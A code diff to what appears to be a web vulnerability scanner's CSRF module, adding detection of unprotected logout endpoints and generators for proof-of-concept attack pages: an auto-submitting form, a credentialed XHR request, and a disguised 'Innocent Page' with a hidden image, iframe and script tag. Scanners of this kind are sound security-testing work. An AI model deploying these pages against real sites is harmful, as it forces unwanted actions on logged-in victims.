@@ -27,6 +27,13 @@ class CSRFModule(BaseModule):
             'token', '__RequestVerificationToken', 'nonce'
         ]
 
+        # Logout endpoints - critical CSRF targets
+        self.logout_keywords = [
+            'logout', 'logoff', 'signout', 'sign-out', 'sign_out',
+            'disconnect', 'end_session', 'endsession', 'terminate',
+            'exit', 'bye', 'leave', 'close_session'
+        ]
+
         # State-changing operations (keywords in forms/URLs)
         # EXPANDED: Added missing keywords identified in Acunetix gap analysis
         self.state_changing_keywords = [
@@ -117,11 +124,26 @@ class CSRFModule(BaseModule):
                     result['owasp'] = self.config.get('owasp', 'A01:2021')
                     result['cvss'] = self.config.get('cvss', '6.5')
 
+                    # Generate POC HTML
+                    result['poc'] = self._generate_csrf_poc(url, params, method)
+                    result['additional_info'] = {
+                        'poc_html': result['poc'],
+                        'auto_submit_poc': self._generate_auto_submit_poc(url, params, method),
+                        'xhr_poc': self._generate_xhr_poc(url, params, method),
+                        'img_poc': self._generate_img_poc(url, params) if method == 'GET' else None
+                    }
+
                     results.append(result)
                     logger.info(f"✓ CSRF vulnerability found in {url} "
                               f"(confidence: {confidence:.2f})")
 
         logger.info(f"CSRF scan complete: {len(results)} vulnerabilities found")
+
+        # ADDITIONAL CHECK: No CSRF on Logout detection
+        # Scan for logout endpoints without CSRF protection
+        logout_results = self._check_logout_csrf(targets, http_client)
+        results.extend(logout_results)
+
         return results
 
     def _is_state_changing(self, url: str, params: Dict[str, Any]) -> bool:
@@ -259,6 +281,287 @@ class CSRFModule(BaseModule):
                 return True, confidence, evidence
 
         return False, 0.0, ""
+
+    def _check_logout_csrf(self, targets: List[Dict[str, Any]],
+                           http_client: Any) -> List[Dict[str, Any]]:
+        """
+        Check for logout endpoints without CSRF protection
+        This is a specific vulnerability: "No CSRF on Logout"
+
+        Attack scenario: Attacker can force-logout authenticated users
+        by embedding logout links in images, iframes, etc.
+
+        Returns:
+            List of vulnerabilities found
+        """
+        results = []
+        checked_urls = set()
+
+        logger.info("Checking for No CSRF on Logout vulnerability...")
+
+        for target in targets:
+            url = target.get('url', '')
+            url_lower = url.lower()
+
+            # Skip already checked URLs
+            if url in checked_urls:
+                continue
+
+            # Check if URL contains logout keywords
+            is_logout = any(kw in url_lower for kw in self.logout_keywords)
+
+            if not is_logout:
+                continue
+
+            checked_urls.add(url)
+            logger.debug(f"Testing logout endpoint: {url}")
+
+            # Check for CSRF protection
+            params = target.get('params', {})
+            method = target.get('method', 'GET').upper()
+
+            # Check if form has CSRF token
+            has_csrf_token = self._has_csrf_token(params)
+
+            if has_csrf_token:
+                logger.debug(f"Logout endpoint has CSRF protection: {url}")
+                continue
+
+            # Test if logout works without token/referer
+            try:
+                headers = {
+                    'Referer': 'https://attacker.com',
+                    'Origin': 'https://attacker.com'
+                }
+
+                if method == 'POST':
+                    response = http_client.post(url, data=params, headers=headers)
+                else:
+                    response = http_client.get(url, headers=headers)
+
+                if not response:
+                    continue
+
+                # Check if logout was triggered
+                response_text = getattr(response, 'text', '').lower()
+                status_code = response.status_code
+
+                # Signs logout worked (redirects are common)
+                logout_success = (
+                    status_code in [200, 302, 303] or
+                    'logged out' in response_text or
+                    'signed out' in response_text or
+                    'session' in response_text and 'ended' in response_text or
+                    'goodbye' in response_text
+                )
+
+                # Check response headers for session cookie deletion
+                set_cookie = response.headers.get('Set-Cookie', '')
+                cookie_cleared = (
+                    'expires=Thu, 01 Jan 1970' in set_cookie or
+                    'max-age=0' in set_cookie.lower() or
+                    '=""' in set_cookie or
+                    '=deleted' in set_cookie.lower()
+                )
+
+                if logout_success or cookie_cleared:
+                    confidence = 0.85
+
+                    # Higher confidence for GET-based logout (worse)
+                    if method == 'GET':
+                        confidence = 0.95
+
+                    evidence = f"Logout endpoint vulnerable to CSRF\n"
+                    evidence += f"{'='*50}\n\n"
+                    evidence += f"URL: {url}\n"
+                    evidence += f"Method: {method}\n\n"
+                    evidence += f"Issue: Logout functionality lacks CSRF protection.\n\n"
+                    evidence += f"Attack Scenario:\n"
+                    evidence += f"- Attacker embeds: <img src=\"{url}\">\n"
+                    evidence += f"- When victim views attacker's page, they are logged out\n"
+                    evidence += f"- Can be used for denial of service or session manipulation\n\n"
+
+                    if method == 'GET':
+                        evidence += "CRITICAL: Logout uses GET method - trivially exploitable!\n"
+                    if cookie_cleared:
+                        evidence += "Session cookie appears to be cleared on request.\n"
+
+                    evidence += f"\nRemediation:\n"
+                    evidence += f"- Require CSRF token for logout\n"
+                    evidence += f"- Use POST method instead of GET\n"
+                    evidence += f"- Validate Referer/Origin headers\n"
+
+                    result = self.create_result(
+                        vulnerable=True,
+                        url=url,
+                        parameter="logout",
+                        payload="Cross-origin request",
+                        evidence=evidence,
+                        description="No CSRF on Logout: Logout endpoint accepts requests without "
+                                  "CSRF token, allowing attackers to force-logout users.",
+                        confidence=confidence
+                    )
+
+                    result['cwe'] = 'CWE-352'
+                    result['owasp'] = 'A01:2021'
+                    result['severity'] = 'medium' if method == 'POST' else 'high'
+                    result['finding_type'] = 'no_csrf_logout'
+
+                    results.append(result)
+                    logger.info(f"✓ No CSRF on Logout found: {url}")
+
+            except Exception as e:
+                logger.debug(f"Error testing logout CSRF: {e}")
+
+        if results:
+            logger.info(f"Found {len(results)} logout endpoints without CSRF protection")
+
+        return results
+
+
+    def _generate_csrf_poc(self, url: str, params: Dict[str, Any], method: str) -> str:
+        """Generate basic CSRF POC HTML form"""
+        from html import escape
+
+        form_inputs = ""
+        for name, value in params.items():
+            escaped_name = escape(str(name))
+            escaped_value = escape(str(value) if value else "test")
+            form_inputs += f'    <input type="hidden" name="{escaped_name}" value="{escaped_value}" />\n'
+
+        poc = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF POC - Dominator</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>Target: {escape(url)}</p>
+    <p>Method: {method}</p>
+
+    <form id="csrf_form" action="{escape(url)}" method="{method}">
+{form_inputs}        <input type="submit" value="Submit Request" />
+    </form>
+
+    <h3>Instructions:</h3>
+    <ol>
+        <li>Victim must be logged into the target application</li>
+        <li>Victim visits this page (attacker controlled)</li>
+        <li>Form can be auto-submitted using JavaScript</li>
+        <li>State-changing action is performed on victim's behalf</li>
+    </ol>
+</body>
+</html>'''
+        return poc
+
+    def _generate_auto_submit_poc(self, url: str, params: Dict[str, Any], method: str) -> str:
+        """Generate auto-submitting CSRF POC"""
+        from html import escape
+
+        form_inputs = ""
+        for name, value in params.items():
+            escaped_name = escape(str(name))
+            escaped_value = escape(str(value) if value else "test")
+            form_inputs += f'    <input type="hidden" name="{escaped_name}" value="{escaped_value}" />\n'
+
+        poc = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <form id="csrf_form" action="{escape(url)}" method="{method}">
+{form_inputs}    </form>
+    <script>
+        // Auto-submit form when page loads
+        document.getElementById("csrf_form").submit();
+    </script>
+</body>
+</html>'''
+        return poc
+
+    def _generate_xhr_poc(self, url: str, params: Dict[str, Any], method: str) -> str:
+        """Generate XHR/Fetch-based CSRF POC"""
+        from html import escape
+        import json
+
+        poc = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF XHR POC</title>
+</head>
+<body>
+    <h1>CSRF via XMLHttpRequest</h1>
+    <p>Target: {escape(url)}</p>
+    <button onclick="sendCSRF()">Execute CSRF Attack</button>
+    <div id="result"></div>
+
+    <script>
+    function sendCSRF() {{
+        var xhr = new XMLHttpRequest();
+        xhr.open("{method}", "{escape(url)}", true);
+        xhr.withCredentials = true; // Include cookies
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        var params = {json.dumps(params)};
+        var body = Object.keys(params).map(k => k + "=" + encodeURIComponent(params[k] || "test")).join("&");
+
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState === 4) {{
+                document.getElementById("result").innerHTML =
+                    "Status: " + xhr.status + "<br>Response: " + xhr.responseText.substring(0, 500);
+            }}
+        }};
+
+        xhr.send(body);
+    }}
+    </script>
+
+    <h3>Note:</h3>
+    <p>This may be blocked by CORS. Works when:</p>
+    <ul>
+        <li>Target has permissive CORS headers</li>
+        <li>Request is "simple" (no custom headers)</li>
+        <li>Using form-based request</li>
+    </ul>
+</body>
+</html>'''
+        return poc
+
+    def _generate_img_poc(self, url: str, params: Dict[str, Any]) -> str:
+        """Generate IMG tag CSRF POC (for GET requests)"""
+        from html import escape
+        from urllib.parse import urlencode
+
+        query_string = urlencode({k: (v if v else "test") for k, v in params.items()})
+        full_url = f"{url}?{query_string}" if query_string else url
+
+        poc = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Page</title>
+</head>
+<body>
+    <h1>Welcome to our site!</h1>
+    <p>Nothing suspicious here...</p>
+
+    <!-- Hidden CSRF attack via IMG tag -->
+    <img src="{escape(full_url)}" style="display:none" />
+
+    <!-- Alternative methods -->
+    <!--
+    <iframe src="{escape(full_url)}" style="display:none"></iframe>
+    <script src="{escape(full_url)}"></script>
+    <link href="{escape(full_url)}" rel="stylesheet">
+    -->
+
+    <h3>Attack Details:</h3>
+    <p>The following request is made when this page loads:</p>
+    <code>GET {escape(full_url)}</code>
+    <p>No user interaction required!</p>
+</body>
+</html>'''
+        return poc
 
 
 def get_module(module_path: str, payload_limit: int = None):
